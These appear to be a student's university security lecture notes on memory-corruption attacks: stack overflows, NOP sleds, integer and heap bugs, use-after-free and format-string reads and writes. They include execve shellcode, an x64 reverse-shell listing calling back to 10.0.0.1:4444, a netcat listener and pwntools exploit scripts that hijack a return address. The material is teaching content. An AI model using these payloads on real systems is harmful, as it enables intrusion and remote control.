---
Class: "[[Security]]"
Sem: WiSe 26/27
---
---
## Index
- [[#Introduction|Introduction]]
	- [[#Introduction#Is it still relevant?|Is it still relevant?]]
- [[#Stack buffer overflow|Stack buffer overflow]]
	- [[#Stack buffer overflow#Shellcode|Shellcode]]
	- [[#Stack buffer overflow#Reverse shells|Reverse shells]]
- [[#Tools|Tools]]
	- [[#Tools#pwntools|pwntools]]
		- [[#pwntools#Shellcode to full exploit chain|Shellcode to full exploit chain]]
- [[#Other memory-corruption classes|Other memory-corruption classes]]
	- [[#Other memory-corruption classes#Integer overflows|Integer overflows]]
	- [[#Other memory-corruption classes#Heap corruption|Heap corruption]]
	- [[#Other memory-corruption classes#Use-after-free|Use-after-free]]
	- [[#Other memory-corruption classes#More classes (background)|More classes (background)]]
- [[#Format-string vulnerabilities|Format-string vulnerabilities]]
	- [[#Format-string vulnerabilities#Read primitive|Read primitive]]
	- [[#Format-string vulnerabilities#Write primitive|Write primitive]]
---
## Introduction
Memory corruption is still one of the most widely used ways to compromise systems (especially legacy and embedded systems without countermeasures). The root cause is that C/C++ give the programmer manual memory management and no bounds checking (reading or writing outside the object’s bounds corrupts adjacent memory).

The arms race of this block:
- attack (overflow) → mitigation (NX, canaries, ASLR) → bypass (ROP, leaks) → …
- ends with removing the bug class entirely (memory-safe languages)

### Is it still relevant?
Microsoft and Chromium both report $\approx 70\%$ of serious bugs are memory-safety issues. Indeed modern exploits shifted to the **heap** (use-after-free, type confusion), but the principle is identical: corrupt data that controls execution.

![[Pasted image 20261117230752.png|510]]

Furthermore embedded/legacy systems often have no ASLR, NX, or canaries so the classic attack works as-is.

>[!tip] The stack overflow is the gateway to all later techniques

---
## Stack buffer overflow

![[Pasted image 20261117231733.png|330]]

An out-of-bounds write past a local buffer corrupts adjacent memory (other locals, saved RBP, the return address, or a function pointer). Furthermore C dues not enforce bounds (e.g., `gets`, `strcpy`, `scanf("%s")`), and hand-written loops all overrun happily.

As a partial defense, compilers reorder locals (buffers last), but that only helps sometimes (e.g., put `auth_successful` below `username[8]`, but even in this case it would be possible to modify the `rbp`, which will be restored at the end of the function via `leave` command).

![[Pasted image 20261117234613.png|406]]

However the real powerful case if we manage to overwrite the **saved return address**, as an attacker may point it at an attacker-controlled shellcode placed in the buffer (`ret` pops the address and jumps there). In this case the attacker must know (or approximate) the
address of the buffer, which can be hard-coded on systems without ASLR

>[!warning] NOP sled
>A long run of `0x90` (**NOP** = "no operation": does nothing, just advances to the next byte) placed *before* the shellcode.
>- **Problem:** the attacker rarely knows the *exact* address of the shellcode; being off by a few bytes lands in the middle of an instruction and crashes.
>- **Solution:** if the return address lands *anywhere* inside the sled, the CPU slides through the NOPs until it reaches and runs the shellcode.
>- **Effect:** turns a pinpoint target into a wide one → *a NOP sled widens the target*.

### Shellcode
The shellcode is an attacker-supplied machine code, jumped to after the corruption (the name comes from its classic goal: spawn a shell `execve("/bin/sh")`).

The shellcode is directly written in assembly, then assembled to raw bytes and it must be *position-independent* (it runs wherever it lands) and is often subject to some constraints (no zero bytes, limited length, printable only).

>[!example]
>Our goal is to execute a shell. We use the `sys_execve(fname, argv, envp)` system call
>
>```asm
>; execve("/bin/sh", NULL, NULL)
>; args: rdi, rsi, rdx; nr in rax
>mov rbx, ’/bin/sh’
>push rbx    ; put string on stack
>push rsp    ; rsp -> the string
>pop rdi     ; rdi = pointer to string
>mov rsi, 0  ; argv = NULL
>mov rdx, 0  ; envp = NULL
>mov al, 59  ; execve syscall number
>syscall
>```
>
>![[Pasted image 20261118000715.png|250]]
>
>The idea is to build the `/bin/sh` string on the stack, point `rdi` at it, and pass two NULL arguments

### Reverse shells
A bind shell listens on the victim, but firewalls usually block inbound connections. A reverse shell connects back to the attacker and hands over a shell, so that the victim initiates the connection (outbound is often allowed) and the attacker runs a listener (e.g., `nc -lvp 4444`).

Is the same shellcode idea, but with socket setup before `execve`

>[!example] x64 reverse shell to `10.0.0.1:4444`
>```
>mov rax, 41    ; socket(
>mov rdi, 2     ; AF_INET,
>mov rsi, 1     ; SOCK_STREAM,
>xor rdx, rdx   ; 0)
>syscall
>mov rdi, rax   ; sockfd
>mov rcx, 0x0100000a5c110002 ; sockaddr
>push rcx
>mov rsi, rsp
>mov rdx, 16
>mov rax, 42    ; connect(fd,&addr,16)
>syscall
>mov rsi, 3     ; dup2 fd -> 0,1,2
>redir:
>dec rsi
>mov rax, 33
>syscall
>jnz redir
>; ... then execve("/bin/sh")
>```

---
## Tools
- `gdb` (+ pwndbg / GEF) → step, inspect registers and the stack, find offsets
- `readelf` / `objdump` → inspect ELF headers, sections, symbols; disassemble
- `nasm` → assemble shellcode (nasm -f elf64)
- `ROPgadget` / `ropper` → search for gadgets (next lecture)
- `pwntools` → the Swiss-army knife for exploit scripts

### pwntools
`pwntools` is a python library that automates the tedious parts of exploitation

```python
from pwn import *
context(arch=’amd64’, os=’linux’)

io = process(’./vuln’) # or: remote(’host’, 1337)
elf = ELF(’./vuln’) # symbols, addresses

payload = b’A’ * 72 # padding to the return address
payload += p64(elf.sym.win) # overwrite saved RIP

io.sendline(payload)
io.interactive()
```

#### Shellcode to full exploit chain
Assemble shellcode, find the offset, inject, hijack `ret` (end to end)

```python
from pwn import *
context(arch=’amd64’, os=’linux’)
sc = asm(shellcraft.sh()) # execve("/bin/sh") shellcode

io = process(’./vuln’) # 1) crash with a cyclic pattern
io.sendline(cyclic(200)); io.wait()
off = cyclic_find(io.corefile.read(io.corefile.rsp, 4))

buf = 0x7fffffffde00 # 2) buffer addr (no ASLR / leaked)
payload = (asm(’nop’)*64 + sc).ljust(off, b’A’) + p64(buf)

io = process(’./vuln’) # 3) fire -> NOP sled -> shell
io.sendline(payload); io.interactive()
```

`shellcraft` builds the shellcode; cyclic finds the `RIP` offset

---
## Other memory-corruption classes
### Integer overflows

```c
int catvars(char *buf1, char *buf2,
			unsigned int len1,
			unsigned int len2) {
	char mybuf[256];
	if ((len1 + len2) > 256) // can wrap!
		return -1;
	memcpy(mybuf, buf1, len1);
	memcpy(mybuf + len1, buf2, len2);
	do_some_stuff(mybuf);
	return 0;
}
```

In this case the problem would be that if `len1` and `len2` are so big that they overflow the size of max int, they would pass the `if` clause if the remaining part is $<256$.

Some other ways would be to do signed/unsigned confusion, or truncation on cast.

### Heap corruption
The heap holds dynamically allocated objects (`malloc` / `free`). The allocator keeps **metadata inline**, right next to your data: each chunk carries its *size* (+ flags) and, when free, *free-list pointers* (`fd`/`bk`).
- **Heap overflow:** writing past chunk A overruns **chunk B's metadata** (not a return address). The attacker **fakes** that metadata (fake size, fake `fd`/`bk`).
- **Why it's powerful:** the allocator *trusts* the metadata. A later `malloc`/`free` operates on the corrupted free list. With attacker-chosen pointers this becomes a **write-what-where** (arbitrary write at an arbitrary address).
- **End game:** that write primitive overwrites a function pointer / GOT entry / etc. → control-flow hijack.

### Use-after-free
This is a temporal memory error (the others so fare are spatial). Sequence:
1. An object is freed, but a pointer to it (a dangling pointer) remains
2. The allocator reuses that memory for a new object
3. The program uses the dangling pointer, now aliasing the new object

If the attacker controls the new object’s contents, they control what the dangling pointer sees (often a function pointer or vtable, control-flow hijack).

This is the dominant bug class in modern browsers and kernels

>[!info] Capiamo
>![[bangdesk.gif]]
>
>Quando fai `free(p)`, succede una cosa sottile: la memoria viene restituita all’allocatore, ma la **variabile `p` continua a contenere lo stesso indirizzo**. Se il codice non azzera `p` (cioè non fa `p = NULL`), ora `p` è un **dangling pointer** (puntatore pendente): punta a un’area che ufficialmente non è più “tua”.
>
>Finché quell’area non viene riassegnata a nessun altro, usarla magari “funziona” per caso. Il problema vero nasce dal **riuso**.
>
>Gli allocatori, per efficienza, **riusano in fretta** la memoria appena liberata: la prossima `malloc` della stessa dimensione tende a restituire **esattamente lo stesso chunk**. Questo crea una situazione di _aliasing_: due puntatori diversi che guardano la stessa memoria, ma pensando a due oggetti diversi.
>
>Timeline tipica di un exploit:
>```c
>Object *p = malloc(sizeof(Object));  // 1. alloco l'oggetto A
>...
>free(p);                             // 2. libero, ma p resta "dangling" (non azzerato)
>...
>char *q = malloc(sizeof(Object));    // 3. l'allocatore ridà lo STESSO chunk
>memcpy(q, attacker_data, ...);       //    l'attaccante riempie q con byte scelti da lui
>...
>p->do_something();                   // 4. il codice usa p come se fosse ancora A
>```
>
>Al passo 4 il programma legge dall’oggetto “A” dei campi che in realtà adesso contengono **dati dell’attaccante** (scritti via `q`). È una **type confusion**: stessa memoria, interpretata come due tipi diversi.
>
>Il caso più pericoloso è con oggetti che contengono **puntatori a funzione**, tipico del C++ con il **vtable pointer**. Un oggetto con metodi virtuali inizia con un puntatore alla sua vtable; chiamare `p->metodo()` significa: leggi il vtable pointer dall’oggetto → leggi l’indirizzo del metodo → salta lì.
>
>Se l’attaccante ha riempito il chunk riusato con un vtable pointer falso, quella chiamata salta a un indirizzo che controlla lui → **dirottamento del control flow** (shellcode, ROP, ecc.).

### More classes (background)
- Type confusion → an object is used as the wrong type (common in JIT engines)
- Uninitialized use → reading memory before it is written
- Off-by-one → a single byte past the bound (e.g., a NUL terminator overwriting the LSB of saved RBP)
- Information leaks → reading memory the attacker shouldn’t see (crucial for bypassing ASLR)

---
## Format-string vulnerabilities
`printf(fmt, ...)` reads its arguments as directed by the format string `fmt` (`%x`, `%d`, `%s`, … each consume the next argument, which come from registers, first six, then the stack).

The bug consists in an attacker-controlled format string (i.e., using `printf(user_input)` instead of `printf("%s", user_input)`).

In the vulnerable version an attacker may put inside `user_input` some format specifiers and `printf` would not find any matching arguments (they are not given). In this case, the specifiers read whatever happens to be in the registers and on the stack.

>[!example]
>```c
>char user_input[] = "hello %x %x %x";
>
>printf(user_input); // reads the string looking for directives, finds %x 
>     	  	 	  	// and looks for the args directly on the stack
>printf("%s", user_input); // just prints "hello %x %x %x" as a string
>```

### Read primitive

```c
printf("%x %x")
```

`%x` prints a value from the argument position (stack/registers) so repeated `%x` walks up the stack, and with `%N$x` you can directly select the $N$-th argument.

`%s` treats the value as a pointer and prints the string it points to, so if the attacker places an address on the stack (in the format string itself), `%s` reads **arbitrary memory**.

This already leaks stack canaries and defeats ASLR

### Write primitive
`%n` writes the number of characters printed so far to a pointed-to address, so if combined with attacker-placed addresses it would be possible to write to an arbitrary address.

In order to control the number written it’s possible to use `%<count>c` which pads the output `<count>` character specified. But in this way it would be difficult to insert for instance a 64-bit address in one shot. For this reason you can use `%hn`/`%hhn` to write 2 bytes/1 byte at a time, in order to build an arbitrary value step-by-step.

>[!question] Why this matters here?
>A format-string write is a targeted write primitive. It does not overflow linearly, so it bypasses stack canaries entirely.
>
>The canonical example of a write primitive that sidesteps a linear-overflow defense.